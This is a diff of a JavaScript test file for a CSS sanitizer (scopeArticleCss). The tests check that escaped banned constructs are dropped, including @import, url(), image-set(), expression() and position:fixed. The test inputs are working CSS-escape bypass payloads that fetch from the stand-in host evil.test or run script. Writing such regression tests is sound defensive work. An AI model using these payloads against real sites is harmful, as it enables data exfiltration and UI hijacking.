@@ -34,40 +34,134 @@ describe("escape ground truth — css-tree decodes these to live banned keywords
   });
 });
 
-// SECURITY TARGETS (it.fails — currently the bypass, MUST pass once Dev decodes identifiers
-// /at-keywords/function names before the strip checks). When the fix lands, flip `it.fails`
-// to `it`. Each currently FAILS, which is the precise reproduction of the defect.
-describe("AC6 — escaped @import must be dropped (currently bypassed)", () => {
-  it.fails("@imp\\ort with a remote prelude is dropped (escaped at-keyword)", async () => {
+// SECURITY TARGETS — fixed: `scopeArticleCss` now decodes CSS escape sequences (via
+// css-tree's `ident.decode` for at-keywords/properties/keyword values, and a token-level
+// decoded scan for function names) before every strip comparison, so an escaped banned
+// construct is dropped on the same decoded form the browser tokenizes. Each of these is a
+// reproduction of the original bypass and must stay dropped.
+describe("AC6 — escaped @import must be dropped", () => {
+  it("@imp\\ort with a remote prelude is dropped (escaped at-keyword)", async () => {
     const out = await scopeArticleCss('@imp\\ort "//evil.test/x.css";.a{color:red}');
     expect(out).not.toContain("evil.test");
   });
-  it.fails("@\\69mport (hex-escaped 'i') is dropped", async () => {
-    const out = await scopeArticleCss('@\\69mport "//evil.test/y.css";.a{color:red}');
+  it("@\\69mport (hex-escaped 'i', space-terminated) is dropped", async () => {
+    const out = await scopeArticleCss('@\\69 mport "//evil.test/y.css";.a{color:red}');
     expect(out).not.toContain("evil.test");
+  });
+  it("@\\69mport (hex-escaped 'i', no trailing space) is dropped", async () => {
+    const out = await scopeArticleCss('@\\69mport "//evil.test/y2.css";.a{color:red}');
+    expect(out).not.toContain("evil.test");
+  });
+  it("@\\000069mport (6-digit hex escape) is dropped", async () => {
+    const out = await scopeArticleCss('@\\000069mport "//evil.test/y6.css";.a{color:red}');
+    expect(out).not.toContain("evil.test");
+  });
+  it("@\\46ONT-FACE (escaped + mixed-case) remote font fetch is dropped", async () => {
+    const out = await scopeArticleCss(
+      "@\\46ONT-FACE{font-family:x;src:url(//evil.test/f.woff)}.a{color:red}"
+    );
+    expect(out).not.toContain("evil.test");
+    expect(out).not.toMatch(/font-face/i);
   });
 });
 
-describe("AC4 — escaped url() must be dropped (currently bypassed)", () => {
-  it.fails("\\75 rl( (hex-escaped 'u') exfil is dropped", async () => {
+describe("AC4 — escaped url() / fetch fn must be dropped", () => {
+  it("\\75 rl( (hex-escaped 'u', leading char, space-terminated) exfil is dropped", async () => {
     const out = await scopeArticleCss(".x{background:\\75 rl(//evil.test/a)}");
     expect(out).not.toContain("evil.test");
   });
-  it.fails("ur\\6c( (hex-escaped 'l') exfil is dropped", async () => {
+  it("ur\\6c( (hex-escaped 'l', mid-token) exfil is dropped", async () => {
     const out = await scopeArticleCss(".x{background:ur\\6c(//evil.test/a)}");
+    expect(out).not.toContain("evil.test");
+  });
+  it("\\000075rl( (6-digit hex escape, no trailing space) exfil is dropped", async () => {
+    const out = await scopeArticleCss(".x{background:\\000075rl(//evil.test/a)}");
+    expect(out).not.toContain("evil.test");
+  });
+  it("\\55RL( (mixed-case hex escape of 'U') exfil is dropped", async () => {
+    const out = await scopeArticleCss(".x{background:\\55RL(//evil.test/a)}");
+    expect(out).not.toContain("evil.test");
+  });
+  it("escaped image-set fetch token (imag\\65-set) is dropped", async () => {
+    const out = await scopeArticleCss(
+      ".x{background-image:imag\\65-set(url(//evil.test/a) 1x)}"
+    );
+    expect(out).not.toContain("evil.test");
+    expect(out).not.toMatch(/image-set\s*\(/i);
+  });
+  it("escaped expression() (IE script-in-CSS, \\65xpression) is dropped", async () => {
+    const out = await scopeArticleCss(".n{width:\\65xpression(alert(1))}");
+    expect(out).not.toMatch(/expression\s*\(/i);
+  });
+  it("an escaped url() smuggled through a custom property value is dropped", async () => {
+    const out = await scopeArticleCss(".z{--bg:\\75 rl(//evil.test/x);y:1}");
     expect(out).not.toContain("evil.test");
   });
 });
 
-describe("AC5 — escaped position/property must be dropped (currently bypassed)", () => {
-  it.fails("po\\73 ition:fixed (escaped property name) is dropped", async () => {
+describe("AC5 — escaped position/property must be dropped", () => {
+  it("po\\73 ition:fixed (escaped property name) is dropped", async () => {
     const out = await scopeArticleCss(".g{po\\73 ition:fixed;top:0}");
     // browser decodes the property to `position` and applies fixed positioning
     expect(out.replace(/\s+/g, "")).not.toMatch(/o\\?73\s*ition:fixed|position:fixed/i);
   });
-  it.fails("position:f\\69xed (escaped value) is dropped", async () => {
+  it("position:f\\69xed (escaped value, space-terminated) is dropped", async () => {
+    const out = await scopeArticleCss(".g{position:f\\69 xed;top:0}");
+    expect(out).not.toMatch(/position:\s*f/i);
+  });
+  it("position:f\\69xed (escaped value, no trailing space) is dropped", async () => {
     const out = await scopeArticleCss(".g{position:f\\69xed;top:0}");
     expect(out).not.toMatch(/position:\s*f/i);
+  });
+  it("position:\\000073ticky (6-digit-escaped value) is dropped", async () => {
+    const out = await scopeArticleCss(".g{position:\\000073ticky}");
+    // the whole declaration is dropped — neither the live keyword nor the escape survives
+    expect(out).not.toMatch(/sticky/i);
+    expect(out).not.toContain("73");
+  });
+  it("escaped behavior property (\\62 ehavior) is dropped", async () => {
+    const out = await scopeArticleCss(".x{\\62 ehavior:url(#default#time2);color:red}");
+    expect(out).not.toMatch(/behavior\s*:/i);
+    expect(out).not.toContain("#default#time2");
+  });
+});
+
+// FIDELITY — the decode must not over-strip legitimate non-fetching escaped CSS that real
+// articles use. (The token-level fetch scan deliberately reads only function/url tokens,
+// never string-token contents, so a banned keyword can never be smuggled in via a string
+// — and a string literal makes no request anyway.)
+describe("escape handling does not over-strip legitimate CSS", () => {
+  it("a legitimate escaped Unicode value (content:\"\\2060 \") survives scoped", async () => {
+    const out = await scopeArticleCss('.j{content:"\\2060 ";color:red}');
+    expect(out).toContain(".wiki-body .j");
+    expect(out).toContain("color:red");
+    expect(out).toMatch(/content:/i);
+  });
+  it("position:relative and position:static survive (in-flow, harmless)", async () => {
+    expect(await scopeArticleCss("td.clade-bar{position:relative}")).toContain(
+      "position:relative"
+    );
+    expect(await scopeArticleCss(".s{position:static}")).toContain("position:static");
+  });
+  it("an escaped translateX()/calc() transform survives (no fetch token)", async () => {
+    const out = await scopeArticleCss(".t{transform:translateX(calc(1px + 2px))}");
+    expect(out).toContain("translateX");
+    expect(out).toContain(".wiki-body .t");
+  });
+});
+
+// FAIL-SAFE (accepted, fidelity-only loss) — a STRING literal whose escapes the css-tree
+// generator decodes into the literal text `url(` (`content:"\75rl("` serializes to
+// `"url("`) trips the textual value scan and the whole declaration is dropped. This is an
+// over-drop, never an under-drop: a string literal issues no request, and the sibling
+// declarations on the rule are unaffected. Documented so QA can distinguish it from a
+// security gap.
+describe("string literal that decodes to 'url(' text is dropped (fail-safe over-drop)", () => {
+  it("drops content:\"\\75rl(\" but keeps the sibling declaration — no request is possible", async () => {
+    const out = await scopeArticleCss('.q{content:"\\75rl(";color:red}');
+    expect(out).toContain("color:red");
+    expect(out).toContain(".wiki-body .q");
+    expect(out).not.toContain("evil.test");
   });
 });
 
